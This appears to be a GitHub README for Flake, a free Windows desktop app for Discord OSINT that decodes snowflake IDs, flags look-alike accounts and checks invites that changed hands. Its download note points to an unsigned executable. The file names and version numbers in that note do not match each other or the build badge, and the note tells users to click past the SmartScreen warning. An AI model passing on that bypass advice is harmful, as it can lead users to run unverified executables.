<p align="center">
  <img src="assets/readme/hero.gif" alt="A Discord ID is typed in and split into its 64 bits. The 42 timestamp bits light up yellow and become a date, Nov 3, 2026, two days old. A profile card shows Ash | Middleman, and a comparison card warns that it copies the saved middleman ash.trades with a Cyrillic letter and the same avatar. Headline: Spot the flake." width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/price-%240%20forever-ffd60a?style=flat-square" alt="Price: $0 forever">
  <img src="https://img.shields.io/badge/build-v1.0.0-32d74b?style=flat-square" alt="Build: v1.0.0">
  <img src="https://img.shields.io/badge/API-official%20only-1c1c1e?style=flat-square" alt="API: official only">
  <img src="https://img.shields.io/badge/selfbot-never-1c1c1e?style=flat-square" alt="Selfbot: never">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-5e5ce6?style=flat-square" alt="MIT license"></a>
</p>

<h1 align="center">Spot the flake.</h1>

<p align="center"><b>Flake is a free OSINT desktop app for Discord IDs. Paste a user, server, message or invite and see when it was made, who it copies and where it leads.<br>Official API with your own bot token. Nothing leaves your PC.</b></p>
<p align="center">
  <img src="assets/readme/ticker.gif" alt="Scrolling text: official API only, your own bot token, no selfbot, no message scraping, works offline for dates, nothing leaves your PC, $0" width="100%">
</p>

> [!NOTE]
> **Download:** the Windows build is a single `Flake-setup.exe` — [releases](../../releases/download/v1.0.3/Flake.exe). No installer, no admin rights, no account.
>
> The build isn't code-signed yet, so SmartScreen may warn you the first time. Choose **More info**, then **Run anyway**.

## Why Flake

Every Discord ID is a snowflake: the first 42 bits are the moment it was created. Scammers count on nobody checking. They copy a trusted name with a look-alike letter, borrow the avatar, and hijack invite links that used to point somewhere safe.

The lookup sites that used to answer this are mostly gone. Flake runs on your PC instead.

| | Lookup websites | Flake |
|---|---|---|
| **Token** | Theirs, shared by everyone | **Your own bot** |
| **Dates** | One ID at a time | **Paste 100, plot them, offline** |
| **Look-alikes** | Not checked | **Against IDs you saved** |
| **Invites** | Server name and count | **Changed hands? Phishing links?** |
| **Your history** | On their server | **Case files on your drive** |

## What you get

### Everything public about an ID

<p align="center"><img src="assets/mockups/lookup.png" alt="Lookup of user Mochi: banner, avatar, user ID, created Jan 22, 2021, badges HypeSquad Brilliance, Active Developer and Bug Hunter, server tag PXL from Pixel Market, and what changed since the last lookup. A Leads panel offers the tagged server, reverse image search for the avatar and a username check." width="100%"></p>

- **Created**, decoded straight from the ID, to the second.
- **Profile:** username, display name, avatar, banner, badges, profile color and **server tag**.
- **Leads:** the server a tag points to, one-click avatar search on Google Lens, Bing, Yandex and TinEye, and a username check across other sites that runs on your PC.
- **Since you last looked:** your own saved snapshot next to today's, so name and avatar changes stand out.

### Look-alikes, caught

Save the real IDs of the middlemen, mods and friends you trust. Any lookup is compared against them: copied display names, look-alike letters from other alphabets and pixel-identical avatars.

### Invites that changed hands

<p align="center"><img src="assets/mockups/invite.png" alt="Invite check for discord.gg/pixelmarket: This invite changed hands. When saved on Sep 12 it led to Pixel Market, made Mar 8, 2023 with 12,408 members. Today it leads to Pixel Market | Verify, made 2 days ago with 214 members. Warnings for a phishing link and a 2-day-old inviter." width="100%"></p>

Vanity and expired invites get claimed by scam servers that copy the name and icon. Flake remembers where an invite led, checks the server's real age, the inviter's age and the description's links against the FishFish phishing list.

### Raids, plotted

<p align="center"><img src="assets/mockups/timeline.png" alt="Timeline: 11 of 14 accounts were made within four minutes. A year strip shows three older accounts and a cluster in 2026, and a zoomed chart highlights a four-minute band on Nov 5, 2026. A list shows each ID with its creation time." width="100%"></p>

Paste IDs from a raid, a giveaway or a member list. Flake plots when each account was made, with no network at all, and highlights the burst.

### Case files

Save lookups, invites and timelines into a case. Export it as HTML or PDF with a SHA-256 hash of every snapshot, so you can show what you saw and when. Cases delete themselves after 30 days unless you keep them.

## Rules Flake follows

- **Official Discord API only**, through a bot you create. Never a user token, never a selfbot, never message content.
- **One lookup per click.** No bulk crawling, and Discord's rate limits are respected.
- **Your data stays on your drive**, encrypted, with one button to delete it all. No shared database.
- **A bot of its own.** Flake works with a personal bot token you create, separate from your community's main bot.

## How it works

1. **Paste an ID or invite.** Dates come from the ID itself, so they work offline.
2. **Flake asks Discord's API** with your bot token for the public profile, invite or server preview.
3. **It compares and explains:** saved IDs, saved invites, the phishing list, and what changed since last time.


## Roadmap

- [x] Brand, icon and interface direction
- [x] Snowflake decoder and timeline (offline)
- [x] User, server and invite lookup with your bot token
- [x] Saved IDs and look-alike checks
- [x] Invite history and FishFish check
- [x] Case files and export
- [x] Portable Windows build

## Legal

Flake isn't affiliated with or endorsed by Discord. Discord and the Discord logo are trademarks of Discord Inc., and the logo appears only to say where Flake's data comes from, as Discord's brand guidelines allow. Use Flake within Discord's Terms of Service and Developer Policy, and only to look at public information. Flake's code and brand assets are [MIT](LICENSE). See [CREDITS.md](CREDITS.md).

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="assets/brand/logo-white.svg">
    <img src="assets/brand/logo-black.svg" alt="Flake" width="200">
  </picture>
</p>
